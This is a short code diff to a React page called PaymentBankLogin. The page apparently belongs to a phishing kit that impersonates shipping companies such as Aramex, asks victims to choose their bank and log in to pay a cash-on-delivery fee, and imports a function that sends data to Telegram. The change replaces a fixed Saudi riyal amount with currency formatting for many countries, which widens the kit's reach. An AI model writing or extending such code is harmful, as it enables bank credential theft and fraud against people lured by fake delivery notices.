@@ -11,6 +11,7 @@ import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
+import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -43,9 +44,13 @@ const PaymentBankLogin = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
+  // Get country from link data
+  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  const formattedAmount = formatCurrency(amount, selectedCountry);
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
